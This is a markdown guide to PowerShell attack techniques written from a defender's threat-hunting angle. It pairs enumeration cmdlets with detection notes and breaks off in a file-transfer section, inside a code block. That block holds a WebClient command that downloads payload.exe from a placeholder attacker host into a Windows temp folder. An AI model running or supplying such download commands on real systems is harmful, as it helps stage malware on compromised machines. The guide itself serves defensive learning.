# ⚡ Hacking with PowerShell: Execution Analysis & Defensive Auditing

A technical reference guide detailing how PowerShell is leveraged within a Windows environment for system enumeration, file transfers, and reverse shell execution, framed entirely through a defensive threat-hunting perspective.

---

## 1. The Defender's Perspective on PowerShell

PowerShell is an incredibly powerful administration tool built into Windows, which makes it a prime target for attackers (**Living off the Land**). Because it interacts directly with the Windows API and runs completely in-memory, attackers use it to bypass traditional file-based antivirus scanners. 

As a Blue Teamer, understanding how malicious scripts are structured allows you to build robust detection rules and parse security logs effectively.

---

## 2. System Enumeration & Asset Auditing

When an adversary gains initial access, their first step is to gather information about the environment. Defenders use these exact same cmdlets to perform rapid asset inventory and verify system state baselines.

### Essential Enumeration Cmdlets

| Objective | PowerShell Cmdlet | Defensive Context / Detection Focus |
| :--- | :--- | :--- |
| **Identify Active User** | `Get-Location` / `whoami` | Audits the current execution context and directory space. |
| **Enumerate Local Users** | `Get-LocalUser` | Inspects local accounts to check for unauthorized profiles or weak passwords. |
| **Audit Active Network Sockets** | `Get-NetTCPConnection` | Replaces the legacy `netstat` tool. Used to hunt for unauthorized listening ports or active outbound C2 connections. |
| **Check Local Hotfixes/Patches** | `Get-HotFix` | Instantly lists installed security updates to identify if the machine is vulnerable to specific exploits. |

---

## 3. File Transfer Analysis (Ingress Tooling)

Attackers frequently use PowerShell to download secondary payloads, malware, or credential-dumping scripts onto a compromised system.

### The Standard Download Method: `System.Net.WebClient`
A common method to download files from an external server over HTTP/S:
```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://<attacker-ip>/payload.exe", "C:\Windows\Temp\payload.exe")
